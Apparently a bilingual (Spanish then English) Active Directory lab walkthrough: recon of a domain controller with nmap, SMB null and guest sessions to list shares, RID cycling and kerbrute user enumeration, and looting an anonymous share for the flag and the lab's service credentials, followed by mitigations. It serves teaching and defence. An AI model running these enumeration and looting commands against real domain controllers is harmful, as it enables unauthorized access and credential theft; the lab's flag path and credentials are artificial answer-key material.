Objetivo

El Domain Controller acepta sesiones nulas y tiene la cuenta Guest habilitada: puedes listar recursos y enumerar usuarios sin credenciales. El recurso //DC01/public es legible de forma anónima y contiene la flag, además de las credenciales de servicio que necesitarás en el resto de laboratorios.

Flag: //{{ ad_dc_host }}/public/flag-ad-01.txt — captúrala en el Domain Controller y valídala en la barra lateral.

Inicio rápido

# Servicios expuestos por el Domain Controller
nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}

# Recursos compartidos sin credenciales
nxc smb {{ ad_dc_ip }} -u '' -p '' --shares

1 · Reconocimiento del Domain Controller

Los puertos delatan un DC: Kerberos (88), LDAP (389/636), Global Catalog (3268) y SMB (445).

nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}

# El nombre del dominio también sale por SMB
nxc smb {{ ad_dc_ip }}
# SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})

2 · Sesión nula: listar recursos compartidos

El servidor tiene restrict anonymous = 0 y map to guest = Bad User, así que una sesión sin credenciales lista los recursos.

# Con netexec (sesión nula y sesión guest)
nxc smb {{ ad_dc_ip }} -u '' -p '' --shares
nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --shares

# Con smbclient
smbclient -N -L //{{ ad_dc_ip }}/

# Con smbmap
smbmap -H {{ ad_dc_ip }} -u '' -p ''

Entre los recursos aparece public con permiso de lectura para todos.

3 · Enumerar usuarios del dominio sin credenciales

Dos vías clásicas: RID cycling por SMB y fuerza bruta de nombres contra el KDC (que responde distinto para un usuario válido).

# RID cycling (enumera SIDs 500-1500 y los traduce a nombres)
nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute
impacket-lookupsid '{{ ad_domain }}/guest:@{{ ad_dc_ip }}' 1500

# Enumeración de usuarios contra Kerberos (no necesita credenciales)
kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt

Guarda la lista de usuarios en users.txt: la vas a reutilizar en los labs de spraying, AS-REP Roasting y Kerberoasting.

nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute 2>/dev/null \
  | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt
cat users.txt

4 · Saquear el recurso anónimo

smbclient -N //{{ ad_dc_ip }}/public
smb: \> ls
smb: \> get flag-ad-01.txt
smb: \> get IT_Onboarding.txt
smb: \> exit

cat flag-ad-01.txt          # ← flag del laboratorio
cat IT_Onboarding.txt   # ← credenciales de svc.readonly

O en una sola línea, sin sesión interactiva:

smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt -' 2>/dev/null
nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .

5 · Capturar la flag

La flag está en flag-ad-01.txt del recurso public:

HL{···}

Y IT_Onboarding.txt te entrega el foothold con el que arrancan el resto de laboratorios de esta categoría:

Usuario : svc.readonly
Password: ReadOnly123!

# Verifícalo:
nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'

Mitigación

  • Deshabilitar el acceso anónimo: RestrictAnonymous = 1 y deshabilitar la cuenta Guest.
  • Nunca publicar credenciales en recursos compartidos; usar gMSA o un gestor de secretos.
  • Restringir el listado de recursos y auditar los accesos anónimos (evento 5140).

Herramientas

netexec (nxc) smbclient smbmap impacket-lookupsid kerbrute enum4linux-ng

1 · Domain Controller recon

The open ports give the DC away: Kerberos (88), LDAP (389/636), Global Catalog (3268) and SMB (445).

nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}

# SMB also leaks the domain name
nxc smb {{ ad_dc_ip }}
# SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})

2 · Null session: list the shares

The server ships restrict anonymous = 0 and map to guest = Bad User, so a credential-less session lists the shares.

# With netexec (null and guest sessions)
nxc smb {{ ad_dc_ip }} -u '' -p '' --shares
nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --shares

# With smbclient
smbclient -N -L //{{ ad_dc_ip }}/

# With smbmap
smbmap -H {{ ad_dc_ip }} -u '' -p ''

A public share shows up, readable by everyone.

3 · Enumerate domain users without credentials

Two classic paths: SMB RID cycling and username brute force against the KDC (which answers differently for a valid user).

# RID cycling (walks SIDs 500-1500 and resolves them to names)
nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute
impacket-lookupsid '{{ ad_domain }}/guest:@{{ ad_dc_ip }}' 1500

# Kerberos user enumeration (no credentials needed)
kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt

Save the user list to users.txt: you will reuse it in the spraying, AS-REP Roasting and Kerberoasting labs.

nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute 2>/dev/null \
  | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt
cat users.txt

4 · Loot the anonymous share

smbclient -N //{{ ad_dc_ip }}/public
smb: \> ls
smb: \> get flag-ad-01.txt
smb: \> get IT_Onboarding.txt
smb: \> exit

cat flag-ad-01.txt          # ← lab flag
cat IT_Onboarding.txt   # ← svc.readonly credentials

Or as a one-liner, no interactive session:

smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt -' 2>/dev/null
nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .

5 · Capture the flag

The flag lives in flag-ad-01.txt inside the public share:

HL{···}

And IT_Onboarding.txt hands you the foothold every other lab in this category starts from:

User    : svc.readonly
Password: ReadOnly123!

# Verify it:
nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'

Mitigation

  • Disable anonymous access: RestrictAnonymous = 1 and disable the Guest account.
  • Never publish credentials on file shares; use gMSA or a secret manager.
  • Restrict share enumeration and audit anonymous access (event 5140).

Tools
